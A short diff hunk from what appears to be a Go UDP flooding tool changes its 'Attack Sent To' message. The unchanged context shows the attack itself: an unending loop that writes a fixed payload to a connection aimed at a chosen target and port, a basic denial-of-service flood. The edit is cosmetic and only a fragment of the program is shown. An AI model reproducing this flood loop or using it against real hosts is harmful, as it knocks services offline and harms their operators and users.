@@ -13,7 +13,7 @@ func main() {
 	if err != nil {
 		print(err)
 	} else {
-		fmt.Println("Attack Sent To " + target + " Using Port " + port + " With udphex!")
+		fmt.Println("Attack Sent To " + target + ":" + port)
 		for {
 			conn.Write([]byte("\x61\x73\x64"))
 		}
